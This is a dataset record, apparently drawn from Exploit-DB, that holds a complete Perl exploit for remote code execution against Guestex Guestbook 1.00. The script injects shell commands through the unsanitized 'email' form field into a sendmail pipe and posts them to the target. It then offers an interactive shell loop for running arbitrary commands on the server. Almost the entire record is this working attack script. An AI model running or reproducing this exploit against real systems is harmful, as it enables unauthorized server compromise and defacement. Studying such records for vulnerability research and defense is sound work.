{
  "id": "1892",
  "title": "Guestex Guestbook 1.00 - &#039;email&#039; Remote Code Execution",
  "cve": null,
  "vuln_type": "rce",
  "code": "## Creator: K-sPecial (xzziroz.net) of .aware (awarenetwork.org)\r\n## Name: GUESTEX-exec.pl\r\n## Date: 06/07/2006\r\n## Version: 1.00\r\n##  1.00 (06/07/2006) - GUESTEX-exec.pl created\r\n## \r\n## Description: GUESTEX guestbook is vulnerable to remote code execution in how it \r\n##  handles it's 'email' parameter. $form{'email'} is used when openning a pipe to \r\n##  sendmail in this manner: open(MAIL, \"$sendmail $form{'email'}) where $form{'email'} \r\n##  is not properly sanitized.\r\n##\r\n## Usage: specify the host and location of the script as the first argument. hosts can \r\n##  contain ports (host:port) and you CAN specify a single command to execute via the \r\n##  commandline, although if you do not you will be given a shell like interface to \r\n##  repeatedly enter commands.\r\n#######################################################################################\r\nuse IO::Socket;\r\nuse strict;\r\n\r\nmy $host = $ARGV[0];\r\nmy $location = $ARGV[1];\r\nmy $command = $ARGV[2];\r\nmy $sock;\r\nmy $port = 80;\r\nmy $comment = $ARGV[3] || \"YOUR SITE OWNS!\\n\";\r\n\r\nif (!($host && $location)) { \r\n\tdie(\"-!> perl $0 <host[:port]> <location> [command] [comment]\\n\");\r\n}\r\n\r\n$port = $1  if ($host =~ m/:(\\d+)/);\r\n\r\nwhile (1) { \r\n\tmy $switch = 0;\r\n\tif (!($ARGV[2])) {\r\n\t\tprint 'guestex-shell$ ';\r\n\t\tchomp($command = <STDIN>);\r\n\t}\r\n\r\n\tmy $cmd = \";echo --1337 start-- ;$command; echo --1337 end--\";\r\n\t$cmd =~ s/(.)/sprintf(\"%%%x\", ord($1))/ge;\r\n\r\n\tmy $POST = \"POST $location HTTP/1.1\\r\\n\"  \t\t             .\r\n\t           \"Host: $host\\r\\n\"                                         .\r\n\t\t   \"User-Agent: mozilla\\r\\n\"                                 .\r\n\t           \"Content-type: application/x-www-form-urlencoded\\r\\n\"     .\r\n\t\t   \"Content-length: \" . length(\"surname=ax0r&nationality=american&country of residence=USA&preview=no&action=add&name=ax0r&site=ax0r net&url=www.ax0r.net&location=atlanta,ga&rating=10&comment=$comment&email=ax0r\\@yahoo.com$cmd\") . \"\\r\\n\" . \r\n\t\t   \"Referer: $host\\r\\n\\r\\n\";\r\n\t\r\n\t$POST .= \"surname=ax0r&nationality=american&country of residence=USA&preview=no&action=add&name=ax0r&site=ax0r net&url=www.ax0r.net&location=atlanta,ga&rating=10&comment=$comment&email=ax0r\\@yahoo.com$cmd\";\r\n\t\r\n\t$sock = IO::Socket::INET->new('PeerAddr' => \"$host\",\r\n        \t                      'PeerPort' => $port,\r\n                \t              'Proto'    => 'tcp',\r\n\t\t\t\t      'Type'     => SOCK_STREAM) or die (\"-!> unable to connect to '$host:$port': $!\\n\");\r\n\r\n\t$sock->autoflush();\r\n\r\n\tprint $sock \"$POST\";\r\n\r\n\t#$switch = 1; # used for debugging if you think 'echo' might not be working, etc\r\n\t \r\n\twhile (my $line = <$sock>) {\r\n\t\tif ($line =~ m/^\\-\\-1337\\ start\\-\\-$/) {\r\n\t\t\t$switch = 1;\r\n\t\t\tnext;\r\n\t\t}\r\n\t\tif ($line =~ m/^\\-\\-1337\\ end\\-\\-$/) {\r\n\t\t\tclose($sock);\r\n\t\t\tlast;\r\n\t\t}\r\n\t\tprint $line if $switch;\r\n\t}\r\n\texit if $ARGV[2];\r\n}\r\n\r\n# milw0rm.com [2006-06-08]",
  "url": "https://www.exploit-db.com/exploits/1892"
}